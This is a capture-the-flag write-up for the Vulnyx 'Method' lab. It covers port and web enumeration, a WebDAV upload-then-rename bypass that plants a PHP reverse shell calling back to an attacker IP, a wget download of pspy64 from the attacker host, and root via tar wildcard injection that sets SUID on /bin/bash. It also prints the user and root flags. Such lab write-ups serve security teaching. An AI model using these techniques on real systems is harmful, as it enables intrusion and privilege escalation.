# Vulnyx: Method

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `davtest` · `cadaver` · `curl` · `nc` · `pspy64` |
| **Tags** | `#WebDAV` `#FileUpload` `#RCE` `#tar` `#WildcardInjection` `#SUID` `#pspy` |
| **URL** | https://vulnyx.com/machines/ |

A WebDAV share accepts uploads but blocks `.php` at upload time — so a file is uploaded with a harmless `.html` extension and then renamed to `.php` through WebDAV's own MOVE capability, sidestepping the check entirely and giving RCE. Root comes from a classic `tar` wildcard injection: a periodic backup job that archives the WebDAV directory with a glob (`*`) is tricked into treating specially-named files as its own command-line options.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn method.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:93:E1:D5 (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details — the web server is `lighttpd`, whose `mod_webdav` is the likely home of any WebDAV share:

```bash
$ sudo nmap -p 22,80 -sCV method.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
|_ssh-hostkey:
|  3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:f3:45:10:58:b0:ce:c6:c3:b4:7a:82:57:3d (ECDSA)
|_  256 0d:da:3e:31:38:fa:b5:49:ab:46:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    lighttpd 1.4.59
|_http-title: Welcome page
|_http-server-header: lighttpd/1.4.59
MAC Address: 08:00:27:93:E1:D5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://method.nyx/
```

<img src="../Images/method/Pasted image 20260829150646.png"/>

A content scan finds the `webdav/` directory — the WebDAV share (the directory really is spelled `webdav` on the box, confirmed against the filesystem later):

```bash
$ ffuf -u http://method.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

webdav                  [Status: 200, Size: 3388, Words: 425, Lines: 53, Duration: 7ms]
.                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
%7Fcheckout%7F          [Status: 403, Size: 341, Words: 31, Lines: 12, Duration: 3ms]
```

### WebDAV Testing

`davtest` probes what file types can actually be uploaded to — and executed on — the WebDAV share. The key result is that executable types like `.php` are blocked on upload while inert ones like `.html` go through:

```bash
$ davtest -url 'http://method.nyx/webdav/'
```

<img src="../Images/method/Pasted image 20260829150726.png"/>

## Initial Access

### RCE via WebDAV Upload + Rename Bypass

The upload filter only inspects the extension at the moment of the `PUT`. WebDAV also supports `MOVE` (rename), and that operation isn't run through the same check — so a PHP payload is uploaded as `.html` (which passes), then renamed to `.php` (which the filter never re-evaluates). Once it ends up as `.php` in a directory `lighttpd` hands to the PHP handler, requesting it executes it.

A PentestMonkey PHP reverse shell is prepared with a `.html` name:

```bash
$ nano rev_shell.html
```

> **Reverse shell:** PHP PentestMonkey

`cadaver` uploads it and then renames it in place:

```bash
$ cadaver 'http://method.nyx/webdav/'
dav:/webdav/> put rev_shell.html
Uploading rev_shell.html to '/webdav/rev_shell.html':
Progress: [====================] 100.0% of 2585 bytes succeeded.

dav:/webdav/> ls
Listing collection '/webdav/': succeeded.
Coll:   DavTestDir eZDqAhZQba6RmsR        4096 Aug 29 08:46
        rev_shell.html                     2585 Aug 29 08:48

dav:/webdav/> rename rev_shell.html rev_shell.php
Renaming '/webdav/rev_shell.html' to '/webdav/rev_shell.php': succeeded.

dav:/webdav/> ls
Listing collection '/webdav/': succeeded.
Coll:   DavTestDir eZDqAhZQba6RmsR        4096 Aug 29 08:46
        rev_shell.php                      2585 Aug 29 08:48
```

### Shell as www-data

Requesting the renamed file triggers it:

```bash
$ curl 'http://method.nyx/webdav/rev_shell.php'
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [method.nyx] 41700
Linux method 6.1.0-5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.10.259-1 (2026-07-02) x86_64 GNU/Linux
14:51:04 up 9 min, 0 users, load average: 0.01, 0.21, 0.17

USER     TTY      FROM             LOGIN@  IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (385): Inappropriate ioctl for device
bash: no job control in this shell
www-data@method:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

`www-data` is the only user account on this box, and the user flag sits in its home directory:

```bash
www-data@method:/$ ls -l /home/www-data/
total 4
-r--------  1 www-data www-data  33 Jul 11 10:36 user.txt

www-data@method:/$ cat /home/www-data/user.txt
5492fc195e7dd4bf3ce4f413674156b6
```

> **User flag:** `5492fc195e7dd4bf3ce4f413674156b6`


## Privilege Escalation

### `tar` Wildcard Injection

With no `sudo` rights and nothing obvious, `pspy64` is dropped in to watch process activity — specifically for scheduled jobs that a normal `ps` snapshot would miss:

```bash
www-data@method:/tmp$ wget http://<ATTACKER_IP>:8000/pspy64
www-data@method:/tmp$ chmod +x pspy64
www-data@method:/tmp$ ./pspy64
```

<img src="../Images/method/Pasted image 20260829150850.png"/>

`pspy` reveals a periodic root job that backs up the WebDAV directory with `tar` using a wildcard — something like `tar czf /backup/webdav.tar.gz *` run from inside `/var/www/html/webdav/`. That wildcard is the whole vulnerability: when the shell expands `*`, it produces a list of filenames, and `tar` doesn't distinguish a filename that begins with `--` from an actual command-line option. A file literally named `--checkpoint=1` is read as the `--checkpoint` flag, and `--checkpoint-action=exec=...` tells `tar` to run a command at that checkpoint. Since `www-data` can write into the directory being archived, planting those two files turns the next backup run into arbitrary command execution as root.

A payload script is written, then the two option-shaped files are created so the wildcard hands them to `tar` as flags:

```bash
www-data@method:/tmp$ cd /var/www/html/webdav/
www-data@method:/var/www/html/webdav$ touch -- "
--checkpoint-action=exec=sh privilege.sh"
www-data@method:/var/www/html/webdav$ touch -- "--checkpoint=1"
www-data@method:/var/www/html/webdav$ echo 'chmod 4755 /bin/bash' > privilege.sh
www-data@method:/var/www/html/webdav$ chmod +x privilege.sh
```

Polling `/bin/bash` shows the SUID bit flip from `-rwxr-xr-x` to `-rwsr-xr-x` once the scheduled `tar` job next runs and executes the planted action:

```bash
www-data@method:/var/www/html/webdav$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

www-data@method:/var/www/html/webdav$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

With the SUID bit set, `bash -p` keeps root's effective privileges instead of dropping them:

```bash
www-data@method:/var/www/html/webdav$ /bin/bash -p
bash-5.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-5.1# cat /root/root.txt
370ac5644039db096693f936c2bca98f
```

> **Root flag:** `370ac5644039db096693f936c2bca98f`

## Takeaways

- An upload filter that only checks the extension at the moment of upload is incomplete if the same protocol (WebDAV, here) also supports a rename or move operation — uploading as something inert and renaming afterward is a reliable way around exactly that gap.
- `tar` wildcard injection is a well-known but still common privilege-escalation vector whenever a scheduled job archives a directory with a glob and any part of that directory is writable by a lower-privileged user — files named to look like `tar` flags get interpreted as flags, not filenames, and `--checkpoint` + `--checkpoint-action` together turn that into command execution.
- `pspy` remains essential for catching this entire class of vulnerability — without visibility into what a scheduled job actually runs, there's no way to know a wildcard-based command is even in play.